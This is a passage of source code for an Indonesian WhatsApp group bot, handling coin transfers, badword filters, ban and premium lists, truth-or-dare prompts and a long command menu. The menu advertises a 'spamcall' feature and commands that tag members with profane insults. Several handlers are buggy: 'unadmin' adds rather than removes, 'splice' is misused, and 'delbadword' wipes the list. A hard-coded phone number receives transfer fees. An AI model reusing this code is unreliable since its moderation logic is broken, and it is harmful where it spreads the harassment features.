                		if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                		const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                		fee = 0.010 *  jumblah
                		hasiltf = jumblah - fee
                		addKoinUser(tujuantf, hasiltf)
                		confirmATM(sender, jumblah)
                		addKoinUser('6282189387018@s.whatsapp.net', fee)
                		reply(`*「 SUKSES 」*\n\nPengiriman uang telah sukses\nDari : +${sender.split("@")[0]}\nKe : +${tujuan}\njJumlah transfer : ${jumblah}\nPajak : ${fee}`)
                
					break
case 'addbadword':
                    if (!isRegistered) return reply(ind.noregis())
                                        if (!isOwner) return reply(ind.ownerb())
                                        if (!isGroupAdmins) return reply(ind.admin())
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    const bw = body.slice(12)
                    bad.push(bw)
                    fs.writeFileSync('./database/kelompok/bad.json', JSON.stringify(bad))
                    reply('Success Menambahkan Bad Word!')
                    break
                case 'delbadword':
                    if (!isRegistered) return reply(ind.noregis())
                                        if (!isOwner) return reply(ind.ownerb())
                                        if (!isGroupAdmins) return reply(ind.admin())
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    let dbw = body.slice(12)
                    bad.splice(dbw)
                    fs.writeFileSync('./database/kelompok/bad.json', JSON.stringify(bad))
                    reply('Success Menghapus BAD WORD!')
                    break 
                case 'listbadword':
                    let lbw = `Ini adalah list BAD WORD\nTotal : ${bad.length}\n`
                    for (let i of bad) {
                        lbw += `➸ ${i.replace(bad)}\n`
                    }
                    await reply(lbw)
                    break 
		
                  case 'antibadword':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
					if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('Ketik 1 untuk mengaktifkan, atau Ketik 0 untuk menonaktifkan')
					if (args[0] === '1') {
              				if (isBadWord) return reply('*Fitur BadWord sudah aktif sebelum nya*')
						badword.push(from)
						fs.writeFileSync('./database/kelompok/badword.json', JSON.stringify(badword))
                  	                        reply(`Sukses mengaktifkan anti badword group di group ini ✔️`)
					client.sendMessage(from,`Perhatian kepada seluruh member antibadword group aktif jika kalian berkata kotor, anda akan di kick!`, text)
					} else if (args[0] === '0') {
						badword.splice(from, 1)
                 	   			fs.writeFileSync('./database/kelompok/badword.json', JSON.stringify(badword))
                 	                        reply(`Sukes menonaktifkan anti badword group di group ini ✔️`)
					} else {
					reply(ind.satukos())
					}
                    break
              case 'soundplaydate':
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				let BOTOPERATORmy = fs.readFileSync('./mp3/Play-Date-Melanie-Martinez-Cover-by-邢凯悦XKY.mp3')
				client.sendMessage(from, BOTOPERATORmy, MessageType.audio, { quoted: mek, ptt: true })
				await limitAdd(sender)
				break
				// MENU AUDIO COK
				case 'sound1':
if (!isRegistered) return reply(ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pusname))
satu = fs.readFileSync('./30detik/sound1.mp3');
client.sendMessage(from, satu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
await limitAdd(sender)
break
case 'sound2':
if (!isRegistered) return reply(ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pusname))
dua = fs.readFileSync('./30detik/sound2.mp3');
client.sendMessage(from, dua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
await limitAdd(sender)
break
case 'sound3':
if (!isRegistered) return reply(ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pusname))
tiga = fs.readFileSync('./30detik/sound3.mp3');
client.sendMessage(from, tiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
await limitAdd(sender)
break
case 'sound4':
if (!isRegistered) return reply(ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pusname))
empat = fs.readFileSync('./30detik/sound4.mp3');
client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
await limitAdd(sender)
break
case 'sound5':
if (!isRegistered) return reply(ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pusname))
lima = fs.readFileSync('./30detik/sound5.mp3');
client.sendMessage(from, lima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
await limitAdd(sender)
break
//=============== BATES COK ===================//
                case 'admin':
				if (!isOwner) return reply(ind.ownerb())
				admm = body.slice(7)
				adm.push(`${admm}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/admin.json', JSON.stringify(adm))
				reply(`Berhasil menambahkan admin bot wa.me/${admm} `)
				break
                case 'unadmin':
				if (!isOwner) return reply(ind.ownerb())
				admm = body.slice(9)
				admin.push(`${adm}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/admin.json', JSON.stringify(adm))
				reply(`Berhasil menambahkan admin bot wa.me/${adm} `)
				break
                case 'premium':
				if (!isOwner) return reply(ind.ownerb())
				premm = body.slice(9)
				prem.push(`${premm}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/premium.json', JSON.stringify(prem))
				reply(`Berhasil menambahkan premium wa.me/${premm} `)
				break
            case 'slot':  //case by rimuru/nayla 
			slot = `╔════════════════════\n`
		    slot += `║╭───────────[ *SLOT* ]───\n`
			slot += `║│➻ ${slot11} ║ ${slot22} ║ ${slot33}\n`
			slot += `║│➻ ${slot44} ║ ${slot55} ║ ${slot66} <====\n`
		    slot += `║│➻ ${slot77} ║ ${slot88} ║ ${slot99}	\n`			  				    
		    slot += `║│➻ GAME : SLOT [ *NEW* ]\n`
			slot += `║╰───────────────────\n`
			slot += `╚════════════════════\n`
			client.sendMessage(from, slot, text, {quoted: mek})
		    break
		    case 'truth':
		if (!isRegistered) return reply(ind.noregis())
		if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
                const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		truteh = await getBuffer(`https://i.ibb.co/tzPwWDH/20210402-203555.jpg`)
		client.sendMessage(from, truteh, image, { caption: '*TRUTH*\n\n'+ ttrth, quoted: mek })
		break
		case 'dare':
		if (!isRegistered) return reply(ind.noregis())
		if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
		const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const deerr = dare[Math.floor(Math.random() * dare.length)]
		tod = await getBuffer(`https://i.ibb.co/SVbfCZY/20210402-203727.jpg`)
		client.sendMessage(from, tod, image, { quoted: mek, caption: '*DARE*\n\n'+ deerr })
		break
		case 'unpremium':
				if (!isOwner) return reply(ind.ownerb())
				premm = body.slice(11)
				prem.splice(`${premm}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/pengguna/premium.json', JSON.stringify(prem))
				reply(`Nomor sudah berakhir menjadi premium wa.me/${premm} `)
				break
                case 'premiumlist':
				client.updatePresence(from, Presence.composing) 
                 if (!isRegistered) return reply( ind.noregis())    
				teks = 'This is list of premium number :\n'
				for (let premm of prem) {
					teks += `~> @${premm.split('@')[0]}\n`
					}
					teks += `Total : ${prem.length}`
				client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": prem}})
				break
                case 'bann':
				if (!isOwner) return reply('*Only Admin bot*')
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
		case 'unbann':
				if (!isOwner) return reply('*Only Admin bot*')
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
                case 'ban':
				if (!isOwner) return reply(ind.ownerb())
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
		case 'unban':
				if (!isOwner) return reply(ind.ownerb())
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
                case 'banlist':
				client.updatePresence(from, Presence.composing) 
				
                 if (!isRegistered) return reply( ind.noregis())    
				teks = 'This is list of banned number :\n'
				for (let benn of ban) {
					teks += `~> @${benn.split('@')[0]}\n`
					}
					teks += `Total : ${ban.length}`
				client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": ban}})
				break

		case 'leaderboard':
		case 'lb':
		if (!isRegistered) return reply(ind.noregis())
				_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
				uang.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
				let leaderboardlvl = '-----[ *LEADERBOARD LEVEL* ]----\n\n'
				let leaderboarduang = '-----[ *LEADERBOARD UANG* ]----\n\n'
				let nom = 0
				try {
				for (let i = 0; i < 10; i++) {
					nom++
					leaderboardlvl += `*[${nom}]* ${_level[i].id.replace('@s.whatsapp.net', '')}\n◪  *XP*: ${_level[i].xp}\n◪  *Level*: ${_level[i].level}\n`
					leaderboarduang += `*[${nom}]* ${uang[i].id.replace('@s.whatsapp.net', '')}\n◪  *Uang*: _Rp${uang[i].uang}_\n◪  *Limit*: ${limitawal - _limit[i].limit}\n`
				}
				await reply(leaderboardlvl)
				await reply(leaderboarduang)
				} catch (err) {
				console.error(err)
				await reply(`minimal 10 user untuk bisa mengakses database`)
				}
				break
		case 'kalkulator':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				if (args.length < 1) return reply(`[❗] Kirim perintah *${prefix}kalkulator [ Angka ]*\nContoh : ${prefix}kalkulator 12*12\n*NOTE* :\n• Untuk Perkalian Menggunakan *\n• Untuk Pertambahan Menggunakan +\n• Untuk Pengurangan Menggunakan -\n• Untuk Pembagian Menggunakan /`)
				const Math_js = require('mathjs')
				mtk = body.slice(12)
				if (typeof Math_js.evaluate(mtk) !== "number") {
					reply(`"${mtk}", Kesalahan!\n[❗] Kirim perintah *${prefix}kalkulator [ Angka ]*\nContoh : ${prefix}kalkulator 12*12\n*NOTE* :\n• Untuk Perkalian Menggunakan *\n• Untuk Pertambahan Menggunakan +\n• Untuk Pengurangan Menggunakan -\n• Untuk Pembagian Menggunakan /`)
				} else {
					reply(`*「 MATH 」*\n\n*Kalkulator*\n${mtk} = ${Math_js.evaluate(mtk)}`)
				}
				await limitAdd(sender)
			break
		case 'dompet':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				const kantong = checkATMuser(sender)
				reply(ind.uangkau(pushname, sender, kantong))
				break
		case 'buylimit':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				payout = body.slice(10)
				const koinPerlimit = 2000
				const total = koinPerlimit * payout
				if ( checkATMuser(sender) <= total) return reply(`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= total ) {
					confirmATM(sender, total)
					bayarLimit(sender, payout)
					await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim* : Admin\n*Penerima* : ${pushname}\n*Nominal pembelian* : ${payout} \n*Harga limit* : ${koinPerlimit}/limit\n*Sisa uang mu* : ${checkATMuser(sender)}\n\nProses berhasil dengan nomer pembayaran\n${createSerial(20)}`)
				} 
				break
		case 'buypremiumlimit':
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				payout = body.slice(17)
				const koinpremPerlimit = 500
				const totalprem = koinpremPerlimit * payout
				if ( checkATMuser(sender) <= totalprem) return reply(`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= totalprem ) {
					confirmATM(sender, totalprem)
					bayarLimit(sender, payout)
					await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim* : zainツ\n*Penerima* : ${pushname}\n*Nominal pembelian* : ${payout} \n*Harga limit* : ${koinpremPerlimit}/limit\n*Sisa uang mu* : ${checkATMuser(sender)}\n\nProses berhasil dengan nomer pembayaran\n${createSerial(20)}`)
				} 
				break
		case 'giftlimit': 
				
                 if (!isRegistered) return reply( ind.noregis())
				if (!isOwner) return reply('*Only Adminban & Owner Kami!*')
				const nomerr = args[0].replace('@','')
                		const jmla = args[1]
                		if (jmla <= 1) return reply(`minimal gift limit adalah 1`)
                		if (isNaN(jmla)) return reply(`limit harus berupa angka`)
                		if (!nomerr) return reply(`maaf format salah\nmasukan parameter yang benar\ncontoh : ${prefix}giftlimit @6282189387018 20`)
                		const cysz = nomerr + '@s.whatsapp.net'
                		var found = false
                        			Object.keys(_limit).forEach((i) => {
                            			if(_limit[i].id === cysz){
                                			found = i
                            			}
                        		})
                        	if (found !== false) {
                            	_limit[found].limit -= jmla
                            	const updated = _limit[found]
                            	const result = `Gift kuota limit sukses dengan NS: ${createSerial(20)} pada ${moment().format('DD/MM/YY HH:mm:ss')}
							*「 GIFT KUOTA LIMIT 」*
							• User : @${updated.id.replace('@s.whatsapp.net','')}
							• Limit: ${limitawal-updated.limit}`
                            	console.log(_limit[found])
                            	fs.writeFileSync('./database/pengguna/limit.json',JSON.stringify(_limit));
                            	reply(result)
                        	} else {
                                reply(`Maaf, nomor ${nomerr} tidak terdaftar di database!`)
                        	}
               			break
		case 'limit':
				
                 if (!isRegistered) return reply( ind.noregis())
				checkLimit(sender)
				break
		case 'setreply':
					if (!isOwner) return reply(ind.ownerb())
					client.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					cr = body.slice(10)
					reply(`reply berhasil di ubah menjadi : ${cr}`)
					await limitAdd(sender)
					break 
		case 'setreplyy':
				if (!isOwner) return reply('*Only Admin bot*')
					client.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					cr = body.slice(10)
					reply(`reply berhasil di ubah menjadi : ${cr}`)
					await limitAdd(sender)
					break 
		case 'grouplist':
					if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
					client.updatePresence(from, Presence.composing) 
					teks = `\`\`\`Ini adalah list group ${namabot} :\n\n\`\`\``
					no = 0
					for (let hehehe of groupId) {
						no += 1
						teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
					}
					teks += `\n\`\`\`Total grup : ${groupId.length}\`\`\``
					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
					break
				
		//daftar 
		/*case 'daftar':
                			if (isRegistered) return  reply(ind.rediregis())
                			if (!q.includes('|')) return  reply(ind.wrongf())
                			const namaUser = q.substring(0, q.indexOf('|') - 0)
                			const umurUser = q.substring(q.lastIndexOf('|') + 1)
                			const serialUser = createSerial(20)
                			if(isNaN(umurUser)) return await reply('Umur harus berupa angka!!')
                			if (namaUser.length >= 30) return reply(`why is your name so long it's a name or a train`)
                			if (umurUser > 40) return reply(`your age is too  old maximum 40 years`)
                			if (umurUser < 12) return reply(`your age is too young minimum 12 years`)
                					try {
								ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@c.us`)
								} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
                					veri = sender
                					if (isGroup) {
                    			addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    			await client.sendMessage(from, ppimg, image, {quoted: mek, caption: ind.registered(namaUser, umurUser, serialUser, time, sender)})
                    			addATM(sender)
                    			addLevelingId(sender)
                    			checkLimit(sender)
                    			console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
                			} else {
                    			addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    			await client.sendMessage(from, ppimg, image, {quoted: mek, caption: ind.registered(namaUser, umurUser, serialUser, time, sender)})
                    			addATM(sender)
                    			addLevelingId(sender)
                    			checkLimit(sender)
                    			console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
                			}
				        break*/
		case 'mining':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pushname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isEventon) return reply(`Maaf ${pushname} event mining tidak di aktifkan oleh owner`)
					if (isOwner | isAdmin | isPremium) {
					const one = Math.ceil(Math.random() * 10000000000000000000000000000000000)
					addLevelingXp(sender, one)
					await reply(`Kamu bagian dari prabayar, aku akan berikan sebanyak *${one}Xp* untuk anda`)
                 					     }else{
					const mining = Math.ceil(Math.random() * 1000000000000)
					addLevelingXp(sender, mining)
					await reply(`*Selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					await limitAdd(sender)
					break
		case 'speed5':
		case 'ping3':
                 if (!isRegistered) return reply( ind.noregis())
					await client.sendMessage(from, `Pong!!!!\nSpeed: ${process.uptime()} _Second_`)
					break
					case 'say':
				teks = body.slice(5)
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply(ind.baned())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply('teksnya mana kak?')
				saying = teks
				client.sendMessage(from, saying, text)
				await limitAdd(sender)
				break
		case 'help': 
		case 'menu':
            costum(`*Sek kang. Lagi tak bukak menune...*`, text, tescuk, ari)
            if (!isRegistered) return reply( ind.noregis())
            over = fs.readFileSync(`./welkam/over.mp3`)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    wew = fs.readFileSync(`./lib/botlogo.jpg`)
                      lzain = `
*「 ${namabot} 」*
${tampilHari}

*_${ultah} lagi 😂_*

•➤ Nama : ${pushname}
•➤ Exp : ${getLevelingXp(sender)}
•➤ limit : ${limitawal}
•➤ link : wa.me/${sender.split("@")[0]}
•➤ Rank : ${role}
•➤ Level : ${getLevelingLevel(sender)}

「 *WAKTU* 」
•➤ Wib : ${wib}
•➤ Wita : ${wita}
•➤ Wit : ${wit}

*「 Status 」*
•➤ ${status}


◯ ${a}DATABASE${a}
│•➤ ${prefix}antivirtex [1/0] *[ NEW ]*
│•➤ ${prefix}antispam [on/off]
├─────────
│${a}DONASINYA KAK${a}
│•➤ ${prefix}donate
│•➤ ${prefix}donasi
├─────────
│${a}STIKER MENU${a}
│•➤ ${prefix}toimg ❌
│•➤ ${prefix}sticker ❌
│•➤ ${prefix}semoji❌
├─────────
│${a}Open World${a}
│•➤ ${prefix}petualang [jakarta]
│•➤ ${prefix}adventure [air]
│•➤ ${prefix}inventori [1]
├─────────
│${a}EXP LIMIT${a}
│•➤ ${prefix}dompet
│•➤ ${prefix}buypremiumlimit
│•➤ ${prefix}buylimit
│•➤ ${prefix}lb
│•➤ ${prefix}leaderboard
│•➤ ${prefix}limit
│•➤ ${prefix}transfer
│•➤ ${prefix}giftlimit
│•➤ ${prefix}kalkulator
│•➤ ${prefix}level
│•➤ ${prefix}profile
├─────────
│${a}GROUP MENU${a}
│•➤ ${prefix}welcome [1/0] 
│•➤ ${prefix}antilink [1/0]
│•➤ ${prefix}leveling [1/0]
│•➤ ${prefix}antibadword [1/0]
│•➤ ${prefix}simih [1/0] 
│•➤ ${prefix}promote [@tag]
│•➤ ${prefix}demote [@tag]
│•➤ ${prefix}tagall
│•➤ ${prefix}listadmin
│•➤ ${prefix}premiumlist
│•➤ ${prefix}banlist
│•➤ ${prefix}blocklist
│•➤ ${prefix}linkgc
│•➤ ${prefix}mining
│•➤ ${prefix}hidetag
│•➤ ${prefix}grouplist
│•➤ ${prefix}add [62]
│•➤ ${prefix}kick [@tag]
│•➤ ${prefix}setname
│•➤ ${prefix}setdesc
│•➤ ${prefix}listadmin
│•➤ ${prefix}leave
│•➤ ${prefix}level
│•➤ ${prefix}grup [buka/tutup]
│•➤ ${prefix}wame
│•➤ ${prefix}wa.me
│•➤ ${prefix}getpp [@tag]
│•➤ ${prefix}getpic [@tag]
│•➤ ${prefix}rptag [@tag]
│•➤ ${prefix}timer
│•➤ ${prefix}sider
│•➤ ${prefix}hacked
├─────────
│${a}ANTILINK SOSMED${a}
│•➤ ${prefix}antilinkyoutube-v [1/0]
│•➤ ${prefix}antilinktelegram [1/0]
│•➤ ${prefix}antilinkyoutube-c [1/b]
├─────────
│${a}OWNER MENU${a}
│•➤ ${prefix}bc
│•➤ ${prefix}bcs
│•➤ ${prefix}antibadword
│•➤ ${prefix}addbadword
│•➤ ${prefix}delbadword
│•➤ ${prefix}bcgc
│•➤ ${prefix}setreply
│•➤ ${prefix}setprefix
│•➤ ${prefix}clearall
│•➤ ${prefix}readall
│•➤ ${prefix}block
│•➤ ${prefix}unblock
│•➤ ${prefix}leave
│•➤ ${prefix}event [1/0]
│•➤ ${prefix}clone
│•➤ ${prefix}del
│•➤ ${prefix}ban [tag]
│•➤ ${prefix}unban 
│•➤ ${prefix}unbann [tag]
│•➤ ${prefix}setreplyy
│•➤ ${prefix}premium [tag]
│•➤ ${prefix}unpremium [tag] 
│•➤ ${prefix}setlimit
│•➤ ${prefix}setmemlimit 
├─────────
│${a}CEK MENU DIRI${a}
│•➤ ${prefix}gantengcek
│•➤ ${prefix}cantikcek
│•➤ ${prefix}jelekcek
│•➤ ${prefix}goblogcek
│•➤ ${prefix}begocek
│•➤ ${prefix}pintercek
│•➤ ${prefix}jagocek
│•➤ ${prefix}nolepcek
│•➤ ${prefix}babicek
│•➤ ${prefix}anjingcek
│•➤ ${prefix}jahatcek
│•➤ ${prefix}haramcek
│•➤ ${prefix}kontolcek
│•➤ ${prefix}pakboycek
│•➤ ${prefix}pakgirlcek
│•➤ ${prefix}bapercek
│•➤ ${prefix}sangecek
├─────────
│${a}KERANG AJAIB${a}
│•➤ bisakah
│•➤ kapankah
│•➤ apakah
│•➤ bagaimanakah
├─────────
│${a}TAG MENU MMBER${a}
│•➤ ${prefix}ganteng
│•➤ ${prefix}cantik
│•➤ ${prefix}jelek
│•➤ ${prefix}goblog
│•➤ ${prefix}bego
│•➤ ${prefix}pinter
│•➤ ${prefix}jago
│•➤ ${prefix}nolep
│•➤ ${prefix}babi
│•➤ ${prefix}anjing
│•➤ ${prefix}jahat
│•➤ ${prefix}haram
│•➤ ${prefix}kontol
│•➤ ${prefix}pakboy
│•➤ ${prefix}pakgirl
│•➤ ${prefix}baper
│•➤ ${prefix}sange
│•➤ ${prefix}hebat
│•➤ ${prefix}wibu
│•➤ ${prefix}sadgirl
│•➤ ${prefix}monyet
│•➤ ${prefix}beban
│•➤ ${prefix}sadboy
│•➤ ${prefix}fitnah
├─────────
│${a}RANDOM MENU${a}
│•➤ ${prefix}spamcall
│•➤ ${prefix}quotesislami
│•➤ ${prefix}quotesnasehat
│•➤ ${prefix}quotescinta
├─────────
│${a}ISLAMI MENU${a}
│•➤ ${prefix}quran
│•➤ ${prefix}niatshalat
│•➤ ${prefix}findnabi
│•➤ ${prefix}asmaulhusna
├─────────
│${a}Upsw${a}
│•➤ ${prefix}upswvideo
│•➤ ${prefix}upswimage
│•➤ ${prefix}upswgif
│•➤ ${prefix}tourl2
│•➤ ${prefix}imgtourl
├─────────
│${a}Mengbuat link${a}
│•➤ ${prefix}tinyurl
│•➤ ${prefix}cuttly
│•➤ ${prefix}shortlink2
│•➤ ${prefix}shortlink3
│•➤ ${prefix}shortlink4
│•➤ ${prefix}shortlink5
│•➤ ${prefix}shortlink6
├─────────
│${a}STALK/APIKEY${a}
│•➤ ${prefix}igstalk
│•➤ ${prefix}githubstalk
│•➤ ${prefix}tiktokstalk
├─────────
│${a}OTHER MENU${a}
│•➤ ${prefix}namaninja
│•➤ ${prefix}alay
│•➤ ${prefix}halah
│•➤ ${prefix}hilih
│•➤ ${prefix}huluh
│•➤ ${prefix}heleh
│•➤ ${prefix}holoh
│•➤ ${prefix}say
│•➤ ${prefix}watak
│•➤ ${prefix}hobi
├─────────
│${a}PICT MENU${a}
│•➤ ${prefix}pictcowok
│•➤ ${prefix}pictcewek
│•➤ ${prefix}ppcouple
│•➤ ${prefix}pinterest
├─────────
│${a}SOUND MENU${a}
│•➤ ${prefix}sound1
│•➤ ${prefix}sound2
│•➤ ${prefix}sound3
│•➤ ${prefix}sound4
│•➤ ${prefix}sound5
│•➤ ${prefix}soundplaydate
├─────────
│${a}Downloader${a}
│•➤ ${prefix}play
│•➤ ${prefix}ytmp3
│•➤ ${prefix}ytmp4
│•➤ ${prefix}igmp4
├─────────
│${a}SEARCHING MENU${a}
│•➤ ${prefix}kbbi
│•➤ ${prefix}playstore
│•➤ ${prefix}moddroid
│•➤ ${prefix}happymod
│•➤ ${prefix}map
│•➤ ${prefix}brainly
│•➤ ${prefix}pinterest
│•➤ ${prefix}wiki
│•➤ ${prefix}lirik
│•➤ ${prefix}googleimage
├─────────
│${a}BERBURU MENU${a}
│•➤ ${prefix}udara [cepet]
│•➤ ${prefix}laut [cepet]
│•➤ ${prefix}darat [cepet]
├─────────
│${a}GAME MENU${a}
│•➤ ${prefix}tebakbendera
│•➤ ${prefix}tebakangka
│•➤ ${prefix}suit
│•➤ ${prefix}kata
├─────────
│${a}INFO MENU${a}
│•➤ ${prefix}infobot
│•➤ ${prefix}infonomor
│•➤ ${prefix}infogempa
│•➤ ${prefix}faktaunik
│•➤ ${prefix}tribunews
│•➤ ${prefix}liputan6
│•➤ ${prefix}foxnews
├─────────
│${a}FUN MENU${a}
│•➤ ${prefix}truth 
│•➤ ${prefix}dare
│•➤ ${prefix}mutual
│•➤ ${prefix}jadian
│•➤ ${prefix}artinama
│•➤ ${prefix}meme
│•➤ ${prefix}memeindo
│•➤ ${prefix}cerpen
├─────────
│${a}TOOLS MENU${a}
│•➤ ${prefix}qrcode
│•➤ ${prefix}suratto
│•➤ ${prefix}kapital
│•➤ ${prefix}textfont
│•➤ ${prefix}slow
│•➤ ${prefix}tupai
│•➤ ${prefix}gemok
│•➤ ${prefix}bass
│•➤ ${prefix}robot
│•➤ ${prefix}readmore
╰───────────────❖

◯ *TQ TO*
├❒${a}RIDWAN${a}
├❒${a}BREMA${a}        
├❒${a}RAHMAD${a}
├❒${a}TOMMY${a}      
├❒${a}AINE TEAM${a}             
└❒${a}PENYEDIA APIKEY${a}

${a}LINK${a} : _https://beacons.page/darrma_


║▌│█║▌│ █║▌│█│║▌║
║▌│█║▌│ █║▌│█│║▌║
©POWERED BY RENEASY-BOT
`
